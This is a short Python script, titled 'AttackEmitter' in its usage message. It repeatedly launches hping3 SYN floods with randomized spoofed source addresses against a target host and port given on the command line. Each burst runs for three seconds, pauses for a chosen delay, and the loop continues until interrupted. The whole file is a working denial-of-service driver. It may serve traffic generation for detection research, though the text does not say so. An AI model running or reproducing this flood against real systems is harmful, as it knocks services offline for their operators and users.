import sys
import subprocess
import time
import threading


class Killer(threading.Thread):
    def __init__(self, process):
        super().__init__()
        self.process = process

    def run(self) -> None:
        time.sleep(3)
        self.process.terminate()
        time.sleep(delay)
        global is_attacking
        is_attacking = False


is_attacking = False
delay = 0
target = ''
port = 80


if len(sys.argv) != 4:
    print("Usage: python3 AttackEmitter [target] [port] [delay]")
    exit(1)
else:
    delay = int(sys.argv[3])
    target = sys.argv[1]
    port = sys.argv[2]

while True:
    try:
        if not is_attacking:
            attack = subprocess.Popen([
                'hping3', '-S', '--flood', '--rand-source', '-p', port, target
            ], stdout=subprocess.PIPE)
            is_attacking = True

            killer = Killer(attack)
            killer.start()
    except KeyboardInterrupt:
        print("Stop attack")
        exit(0)



